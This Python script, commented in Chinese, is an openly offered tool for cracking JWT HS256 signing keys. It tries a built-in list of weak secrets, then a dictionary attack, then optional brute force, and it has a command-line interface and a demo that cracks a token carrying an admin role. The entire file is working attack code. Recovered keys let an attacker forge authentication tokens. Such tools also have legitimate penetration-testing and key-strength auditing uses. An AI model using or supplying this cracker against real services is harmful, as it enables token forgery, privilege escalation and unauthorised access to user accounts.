"""
JWT HS256签名密钥破解脚本
支持字典攻击和暴力破解
"""

import jwt
import hashlib
import hmac
import base64
import json
import itertools
import string
import time
from typing import Optional, List, Generator
import argparse


class JWTCracker:
    def __init__(self, token: str):
        """
        初始化JWT破解器
        
        Args:
            token: 要破解的JWT令牌
        """
        self.token = token
        self.header, self.payload, self.signature = self._parse_jwt()
        
    def _parse_jwt(self) -> tuple:
        """解析JWT令牌"""
        try:
            parts = self.token.split('.')
            if len(parts) != 3:
                raise ValueError("无效的JWT格式")
            
            # 解码header和payload
            header = self._decode_base64url(parts[0])
            payload = self._decode_base64url(parts[1])
            
            print(f"Header: {header}")
            print(f"Payload: {payload}")
            
            return parts[0], parts[1], parts[2]
        except Exception as e:
            raise ValueError(f"JWT解析失败: {e}")
    
    def _decode_base64url(self, data: str) -> dict:
        """解码Base64URL编码的数据"""
        # 添加必要的填充
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        
        decoded = base64.urlsafe_b64decode(data)
        return json.loads(decoded.decode('utf-8'))
    
    def _verify_signature(self, secret: str) -> bool:
        """验证签名是否正确"""
        try:
            # 使用PyJWT库验证
            jwt.decode(self.token, secret, algorithms=['HS256'])
            return True
        except jwt.InvalidSignatureError:
            return False
        except Exception:
            return False
    
    def dictionary_attack(self, wordlist: List[str]) -> Optional[str]:
        """
        字典攻击
        
        Args:
            wordlist: 密码字典列表
            
        Returns:
            找到的密钥，如果没找到返回None
        """
        print(f"开始字典攻击，测试 {len(wordlist)} 个密码...")
        
        for i, word in enumerate(wordlist):
            if i % 1000 == 0 and i > 0:
                print(f"已测试 {i} 个密码...")
            
            if self._verify_signature(word):
                return word
        
        return None
    
    def brute_force_attack(self, charset: str = None, min_length: int = 1, max_length: int = 8) -> Optional[str]:
        """
        暴力破解攻击
        
        Args:
            charset: 字符集，默认为数字和小写字母
            min_length: 最小密码长度
            max_length: 最大密码长度
            
        Returns:
            找到的密钥，如果没找到返回None
        """
        if charset is None:
            charset = string.ascii_lowercase + string.digits
        
        print(f"开始暴力破解攻击...")
        print(f"字符集: {charset}")
        print(f"长度范围: {min_length}-{max_length}")
        
        total_combinations = sum(len(charset) ** length for length in range(min_length, max_length + 1))
        print(f"总共需要测试: {total_combinations} 种组合")
        
        tested = 0
        start_time = time.time()
        
        for length in range(min_length, max_length + 1):
            print(f"\n测试长度 {length} 的密码...")
            
            for combination in itertools.product(charset, repeat=length):
                password = ''.join(combination)
                tested += 1
                
                if tested % 10000 == 0:
                    elapsed = time.time() - start_time
                    rate = tested / elapsed
                    print(f"已测试 {tested} 个密码，速度: {rate:.2f} 密码/秒")
                
                if self._verify_signature(password):
                    return password
        
        return None
    
    def common_secrets_attack(self) -> Optional[str]:
        """测试常见的弱密钥"""
        common_secrets = [
            'secret', 'password', '123456', 'admin', 'test', 'key',
            'jwt_secret', 'secret_key', 'my_secret', 'supersecret',
            'qwerty', '111111', '000000', 'abc123', 'password123',
            'Secret', 'SECRET', 'Password', 'ADMIN', 'TEST',
            '', ' ', 'null', 'undefined', 'false', 'true', '0', '1',
            'secretkey', 'jwt', 'token', 'auth', 'login', 'session'
        ]
        
        print("测试常见弱密钥...")
        
        for secret in common_secrets:
            if self._verify_signature(secret):
                return secret
        
        return None


def load_wordlist(filename: str) -> List[str]:
    """从文件加载密码字典"""
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"字典文件 {filename} 不存在")
        return []
    except Exception as e:
        print(f"读取字典文件失败: {e}")
        return []


def create_sample_wordlist() -> List[str]:
    """创建一个示例密码字典"""
    wordlist = []
    
    # 常见密码
    common_passwords = [
        '123456', 'password', '123456789', '12345678', '12345',
        '1234567', '1234567890', 'qwerty', 'abc123', '111111',
        'dragon', 'master', 'monkey', 'letmein', 'login',
        'princess', 'qwertyuiop', 'solo', 'passw0rd', 'starwars'
    ]
    wordlist.extend(common_passwords)
    
    # JWT相关词汇
    jwt_words = [
        'jwt', 'secret', 'key', 'token', 'auth', 'signature',
        'jwtsecret', 'secretkey', 'jwtkey', 'authkey', 'tokenkey'
    ]
    wordlist.extend(jwt_words)
    
    # 数字组合
    for i in range(10000):
        wordlist.append(str(i).zfill(4))
    
    return wordlist


def main():
    parser = argparse.ArgumentParser(description='JWT HS256签名密钥破解工具')
    parser.add_argument('token', help='要破解的JWT令牌')
    parser.add_argument('-w', '--wordlist', help='密码字典文件路径')
    parser.add_argument('-b', '--brute-force', action='store_true', help='启用暴力破解')
    parser.add_argument('--min-length', type=int, default=1, help='暴力破解最小长度')
    parser.add_argument('--max-length', type=int, default=6, help='暴力破解最大长度')
    parser.add_argument('--charset', help='暴力破解字符集')
    
    args = parser.parse_args()
    
    # 验证JWT格式
    if args.token.count('.') != 2:
        print("错误: 无效的JWT格式")
        return
    
    try:
        cracker = JWTCracker(args.token)
        print("=" * 50)
        print("JWT HS256 签名密钥破解工具")
        print("=" * 50)
        
        # 1. 测试常见弱密钥
        print("\n步骤 1: 测试常见弱密钥")
        secret = cracker.common_secrets_attack()
        if secret is not None:
            print(f"找到密钥: '{secret}'")
            return
        
        # 2. 字典攻击
        if args.wordlist:
            wordlist = load_wordlist(args.wordlist)
        else:
            print("\n生成示例密码字典...")
            wordlist = create_sample_wordlist()
        
        if wordlist:
            print(f"\n步骤 2: 字典攻击")
            secret = cracker.dictionary_attack(wordlist)
            if secret is not None:
                print(f"找到密钥: '{secret}'")
                return
        
        # 3. 暴力破解
        if args.brute_force:
            print(f"\n步骤 3: 暴力破解")
            charset = args.charset or (string.ascii_lowercase + string.digits)
            secret = cracker.brute_force_attack(
                charset=charset,
                min_length=args.min_length,
                max_length=args.max_length
            )
            if secret is not None:
                print(f"找到密钥: '{secret}'")
                return
        
        print("\n未能破解密钥")
        print("建议:")
        print("1. 尝试更大的字典文件")
        print("2. 增加暴力破解的长度范围")
        print("3. 扩展字符集包含大写字母和特殊字符")
        
    except Exception as e:
        print(f"错误: {e}")


def demo():
    """演示用法"""
    print("JWT密钥破解演示")
    
    # 创建一个测试JWT
    test_secret = "secret123"
    test_payload = {"user": "admin", "role": "administrator"}
    test_token = jwt.encode(test_payload, test_secret, algorithm="HS256")
    
    print(f"测试JWT: {test_token}")
    print(f"实际密钥: {test_secret}")
    
    # 破解
    cracker = JWTCracker(test_token)
    
    # 测试常见密钥
    secret = cracker.common_secrets_attack()
    if secret:
        print(f"通过常见密钥破解成功: {secret}")
        return
    
    # 生成简单字典
    simple_wordlist = ['test', 'admin', 'password', 'secret', 'key', 'secret123']
    secret = cracker.dictionary_attack(simple_wordlist)
    if secret:
        print(f"通过字典攻击破解成功: {secret}")
        return
    
    print("破解失败")


if __name__ == '__main__':
    # 如果没有命令行参数，运行演示
    import sys
    if len(sys.argv) == 1:
        demo()
    else:
        main()
